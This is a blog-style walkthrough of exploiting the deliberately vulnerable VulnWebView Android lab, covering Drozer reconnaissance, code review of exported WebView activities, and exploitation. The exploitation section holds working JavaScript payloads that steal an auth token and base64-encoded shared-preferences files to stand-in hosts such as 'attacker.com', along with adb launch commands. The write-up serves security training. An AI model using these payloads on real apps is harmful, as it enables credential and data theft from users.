---
description: 'Lab Link: https://github.com/t4kemyh4nd/vulnwebview'
---

# Hacking the VulnWebView Lab

In this blog post, I’ll walk you through how I hacked the **VulnWebView** lab, an Android application designed to demonstrate common WebView vulnerabilities. By exploiting these vulnerabilities, I was able to achieve **Cross-Site Scripting (XSS)**, **token theft**, and **local file exfiltration**. Let’s dive into the details!

***

#### **1. Reconnaissance**

Before diving into exploitation, I started by analyzing the app using the **Drozer** framework. This helped me understand the attack surface and identify potential vulnerabilities.

**Drozer Commands**

```bash
❯ drozer console connect
dz> run app.package.list -f vulnwebview
Attempting to run shell module
com.tmh.vulnwebview (Vuln Web View)

dz> run app.package.info -a com.tmh.vulnwebview
Attempting to run shell module
Package: com.tmh.vulnwebview
  Application Label: Vuln Web View
  Process Name: com.tmh.vulnwebview
  Version: 1.0
  Data Directory: /data/user/0/com.tmh.vulnwebview
  APK Path: /data/app/~~APm9rOCvrbng9-T3LMK5cg==/com.tmh.vulnwebview-rqHlBHSQpZJBVQmg8fONOA==/base.apk
  UID: 10132
  GID: [3003]
  Shared Libraries: [/system/framework/android.test.base.jar]
  Shared User ID: null
  Uses Permissions:
  - android.permission.INTERNET
  - android.permission.READ_EXTERNAL_STORAGE
  - android.permission.ACCESS_MEDIA_LOCATION
  Defines Permissions:
  - None

dz> run app.package.attacksurface com.tmh.vulnwebview
Attempting to run shell module
Attack Surface:
  3 activities exported
  0 broadcast receivers exported
  0 content providers exported
  0 services exported
    is debuggable
```

**Findings**

* The app has **3 exported activities**.
* It is **debuggable**, which makes it easier to analyze.
* It uses **WebView** components, which are often prone to vulnerabilities.

***

#### **2. Analyzing the Android Manifest**

Next, I decompiled the app using **Jadx** to inspect the `AndroidManifest.xml` file. This revealed the exported activities and their configurations.

**Exported Activities**

```xml
<activity
    android:name="com.tmh.vulnwebview.SupportWebView"
    android:exported="true"/>
<activity
    android:name="com.tmh.vulnwebview.RegistrationWebView"
    android:exported="true"/>
<activity android:name="com.tmh.vulnwebview.MainActivity">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```

**Key Observations**

* **SupportWebView** and **RegistrationWebView** are exported without intent filters, making them accessible to other apps.
* **MainActivity** has an intent filter and is the launcher activity.

***

#### **3. Inspecting the Source Code**

I then analyzed the source code of the exported activities to identify vulnerabilities.

**SupportWebView**

```java
public void loadWebView() {
    WebView webView = (WebView) findViewById(R.id.webview2);
    webView.setWebChromeClient(new WebChromeClient());
    webView.setWebViewClient(new WebViewClient());
    webView.getSettings().setJavaScriptEnabled(true);
    Map<String, String> extraHeaders = new HashMap<>();
    extraHeaders.put("Authorization", getUserToken());
    webView.addJavascriptInterface(new WebAppInterface(this), "Android");
    webView.loadUrl(getIntent().getStringExtra("support_url"), extraHeaders);
}
```

**Vulnerabilities in SupportWebView**

1.  **JavaScript Enabled**:

    ```java
    webView.getSettings().setJavaScriptEnabled(true);
    ```

    * Enabling JavaScript allows for potential XSS attacks.
2.  **JavaScript Interface**:

    ```java
    webView.addJavascriptInterface(new WebAppInterface(this), "Android");
    ```

    * This exposes the `WebAppInterface` to JavaScript, allowing attackers to call Java methods.
3.  **Loading URLs from Intent Extras**:

    ```java
    webView.loadUrl(getIntent().getStringExtra("support_url"), extraHeaders);
    ```

    * Loading URLs from intent extras without validation can lead to malicious URL loading.

***

**RegistrationWebView**

```java
private void loadWebView() {
    WebView webView = (WebView) findViewById(R.id.webview);
    webView.setWebChromeClient(new WebChromeClient() {
        @Override
        public boolean onConsoleMessage(ConsoleMessage consoleMessage) {
            Log.d("MyApplication", consoleMessage.message() + " -- From line " + consoleMessage.lineNumber() + " of " + consoleMessage.sourceId());
            return true;
        }
    });
    webView.setWebViewClient(new WebViewClient());
    webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
    webView.getSettings().setJavaScriptEnabled(true);
    if (getIntent().getExtras().getBoolean("is_reg", false)) {
        webView.loadUrl("file:///android_asset/registration.html");
    } else {
        webView.loadUrl(getIntent().getStringExtra("reg_url"));
    }
}
```

**Vulnerabilities in RegistrationWebView**

1.  **Universal Access from File URLs**:

    ```java
    webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
    ```

    * This allows JavaScript running in the context of a file URL to access content from any origin, leading to local file exfiltration.
2.  **Loading URLs from Intent Extras**:

    ```java
    webView.loadUrl(getIntent().getStringExtra("reg_url"));
    ```

    * Similar to `SupportWebView`, this can lead to malicious URL loading.

***

#### **4. Exploitation**

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Exploit Exported **SupportWebView**

```bash
adb shell am start -n com.tmh.vulnwebview/.SupportWebView --es support_url "https://evil.com"
```

***

**Exploiting SupportWebView for Token Theft**

The `WebAppInterface` exposes a method (`getUserToken`) that returns a token. An attacker can steal this token using JavaScript.

**Exploit JavaScript Code**:

```html
<script type="text/javascript">
    var token = Android.getUserToken();
    fetch('https://attacker-server.com/steal?token=' + token);
</script>
```

**Steps**:

1. Host the exploit script on a server (e.g., using Ngrok).
2.  Launch the `SupportWebView` activity with the malicious URL:

    ```bash
    adb shell am start -n com.tmh.vulnwebview/.SupportWebView --es support_url "https://attacker-server.com/exploit.html"
    ```
3. The token will be sent to the attacker's server.

***

#### Exploiting SupportWebView for Cross Site Scripting XSS

```html
<script type="text/javascript">
    alert("0x88");
</script>
```

**Steps**:

1. Host the exploit script on a server (e.g., using Ngrok).
2.  Launch the `SupportWebView` activity with the malicious URL:

    ```bash
    adb shell am start -n com.tmh.vulnwebview/.SupportWebView --es support_url "https://attacker-server.com/exploit.html"
    ```
3. The token will be sent to the attacker's server.

***

**Exploiting RegistrationWebView for Local File Exfiltration**

<figure><img src="../../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>

The `setAllowUniversalAccessFromFileURLs(true)` setting allows JavaScript to read local files and exfiltrate them.

**Exploit JavaScript Code**:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
  <script>
    // Target local file to read (e.g., shared preferences file)
    var url = 'file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml';

    // Function to load and exfiltrate the file contents
    function load(url) {
        var xhr = new XMLHttpRequest(); // Create a new XMLHttpRequest object

        // Define the onreadystatechange event handler
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) { // Check if the request is complete
                // Encode the file contents in Base64
                var base64Content = btoa(xhr.responseText);

                // Send the encoded content to the attacker's server
                fetch('https://attacker.com/?exfiltrated=' + base64Content)
                    .then(response => console.log('Data exfiltrated successfully'))
                    .catch(error => console.error('Exfiltration failed:', error));
            }
        };

        // Open and send the GET request
        xhr.open('GET', url, true);
        xhr.send('');
    }

    // Trigger the exploit
    load(url);
  </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
```

**Steps**:

1.  Save the exploit script as `poc.html` and push it to the device:

    ```bash
    adb push poc.html /sdcard/poc.html
    ```
2.  Launch the `RegistrationWebView` activity with the malicious file URL:

    ```bash
    adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url "file:///sdcard/poc.html"
    ```
3. The contents of `MainActivity.xml` will be exfiltrated to the attacker's server.

### Resources

{% embed url="https://www.hackingarticles.in/android-penetration-testing-webview-attacks/" %}

